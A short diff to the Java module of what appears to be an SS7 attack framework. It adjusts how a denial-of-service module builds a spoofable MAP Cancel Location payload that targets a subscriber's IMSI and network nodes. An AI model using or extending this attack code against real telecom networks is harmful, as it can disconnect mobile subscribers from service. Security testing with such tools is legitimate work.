@@ -24,6 +24,7 @@
 package com.rodan.intruder.ss7.usecases.attacks.dos;
 
 import com.rodan.intruder.ss7.entities.event.model.mobility.ClResponse;
+import com.rodan.intruder.ss7.entities.event.model.mobility.details.CancellationType;
 import com.rodan.intruder.ss7.entities.event.service.MapMobilityServiceListener;
 import com.rodan.intruder.ss7.entities.payload.mobility.ClPayload;
 import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
@@ -57,10 +58,12 @@ public class DosClModule extends Ss7ModuleTemplate implements SignalingModule, M
         logger.debug("Generating payload");
         logger.debug("Module Options: " + moduleOptions);
         var options = (DosClOptions) moduleOptions;
+        var localGt = options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle();
+        //  TODO Check CancellationType.subscriptionWithdraw
         var payload = ClPayload.builder()
-                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
-                .imsi(options.getImsi()).targetVlrGt(options.getTargetVlrGt())
-                .targetHlrGt(options.getTargetHlrGt()).spoofHlr(options.getSpoofHlr())
+                .localGt(localGt).imsi(options.getImsi()).targetVlrGt(options.getTargetVlrGt())
+                .targetHlrGt(options.getTargetHlrGt()).cancellationType(CancellationType.updateProcedure)
+                .spoofHlr(options.getSpoofHlr())
                 .mapVersion(options.getMapVersion())
                 .build();
         setMainPayload(payload);
